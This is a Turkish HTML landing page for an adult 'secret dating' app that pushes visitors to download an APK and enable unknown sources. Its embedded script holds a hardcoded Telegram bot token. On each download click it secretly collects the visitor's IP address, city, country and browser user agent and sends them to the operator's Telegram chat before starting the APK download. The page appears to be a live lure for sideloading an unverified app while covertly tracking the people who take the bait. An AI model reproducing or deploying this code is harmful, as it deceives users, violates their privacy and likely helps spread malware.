<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECRET TANISMA +18</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto+Mono:wght@400;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: linear-gradient(135deg, #0a0005, #2a001a, #1a000f);
            color: #fff;
            font-family: 'Roboto Mono', monospace;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at 50% 30%, rgba(255, 20, 147, 0.25), transparent 70%);
            animation: pulse 12s ease-in-out infinite;
            z-index: 1;
        }

        .container {
            text-align: center;
            z-index: 10;
            position: relative;
        }

        .title {
            font-family: 'Playfair Display', serif;
            font-size: 4.8rem;
            font-weight: 700;
            background: linear-gradient(90deg, #ff1493, #ff69b4, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px #ff1493,
                         0 0 80px #ff00ff;
            margin: 0 0 15px 0;
            letter-spacing: 2px;
        }

        .subtitle {
            font-size: 1.65rem;
            color: #ffb3d1;
            margin-bottom: 50px;
            text-shadow: 0 0 25px rgba(255, 179, 209, 0.6);
            line-height: 1.4;
        }

        .highlight {
            color: #ff1493;
            font-weight: bold;
        }

        .download-btn {
            display: inline-block;
            padding: 24px 85px;
            font-size: 1.85rem;
            font-weight: 700;
            color: #000;
            background: linear-gradient(90deg, #ff1493, #ff69b4, #ff00ff);
            border-radius: 60px;
            text-decoration: none;
            box-shadow: 
                0 0 35px #ff1493,
                0 0 70px #ff00ff,
                inset 0 0 25px rgba(255,255,255,0.7);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .download-btn:hover {
            transform: scale(1.15) translateY(-8px);
            box-shadow: 
                0 0 60px #ff1493,
                0 0 110px #ff00ff;
            background: linear-gradient(90deg, #ff00ff, #ff1493);
        }

        .download-btn::after {
            content: '🔥';
            position: absolute;
            right: 25px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 2rem;
            animation: fire 1.5s infinite;
        }

        .warning {
            margin-top: 70px;
            color: #ffcc00;
            font-size: 1.15rem;
            text-shadow: 0 0 15px #ffcc00;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        @keyframes fire {
            0%, 100% { transform: translateY(-50%) scale(1); }
            50% { transform: translateY(-50%) scale(1.3); }
        }
    </style>
</head>
<body>

    <div class="container">

            Yetişkinler için <span class="highlight">gerçek tanışma</span><br>
            Gizli sohbetler • Sıcak buluşmalar • <span class="highlight">Sınır yok</span>
        </p>
        
        <a href="#" onclick="handleDownload()" class="download-btn">
            APK'YI İNDİR
        </a>

        <p class="warning">
            18+ • İndirdikten sonra bilinmeyen kaynakları açın
        </p>
    </div>

    <script>
        // ================== AYARLAR (DOLDURULDU) ==================
        const BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
        const CHAT_ID   = "-1003887845842";

        const APK_URL   = "uygulaman.apk";     // ← Burayı kendi APK dosya adınla değiştir
        const APK_NAME  = "SecretTanisma18.apk";

        async function sendLog() {
            const ipData = await fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .catch(() => ({}));

            const message = `🔥 *Yeni +18 İndirme!*\n\n` +
                            `🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n` +
                            `🌐 IP: \`${ipData.ip || 'Bilinmiyor'}\`\n` +
                            `📍 Konum: ${ipData.city || ''}, ${ipData.country || ''}\n` +
                            `📱 Cihaz: ${navigator.userAgent}\n` +
                            `🔗 Sayfa: ${window.location.href}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }

        function handleDownload() {
            sendLog();

            setTimeout(() => {
                const link = document.createElement('a');
                link.href = APK_URL;
                link.download = APK_NAME;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 350);
        }
    </script>
</body>
</html>
